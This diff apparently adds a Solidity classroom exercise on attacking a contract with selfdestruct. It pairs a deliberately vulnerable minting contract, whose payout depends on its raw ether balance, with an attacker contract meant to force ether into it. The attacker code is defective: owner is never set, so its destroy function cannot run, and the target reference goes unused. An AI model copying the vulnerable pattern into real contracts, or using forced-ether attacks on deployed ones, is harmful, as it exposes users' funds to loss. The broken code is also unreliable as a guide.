@@ -1,0 +1,45 @@
+// SPDX-License-Identifier: MIT 
+
+// Assignment: Write a code to hack a contract using self destruct. 
+// Contracts can be deleted from the blockchain by calling selfdestruct. selfdestruct sends all remaining Ether stored in the contract to a designated address.
+
+pragma solidity ^ 0.8.7;
+
+contract Mint{
+  address public lastMinter;
+  uint public target = 30 ether;
+  
+  function depositMintingEther() public payable  {
+  		require(msg.value == 1 ether, "You can only mint one NFT at a time");
+      uint bal = address(this).balance;
+      
+      require(bal <= target, "We have run out of NFTs");
+      
+      if(bal == target){
+      		lastMinter = msg.sender;
+      }
+  }
+          
+  function receiveFunds() public {
+  		require(msg.sender == lastMinter);
+          
+      (bool success, ) = msg.sender.call{value : address(this).balance}("");      
+      require(success, "Cannot send funds");
+      }
+  }
+          
+contract Attack{
+       address public owner;
+   Mint badMinter;
+   constructor(Mint _badMinter) {
+   		badMinter = Mint(_badMinter);
+   }
+   
+   function destroy(address apocalypse) public {
+		require(owner == msg.sender, "only the owner can call this");       
+    		selfdestruct(payable(apocalypse));
+}
+}
+
+
+
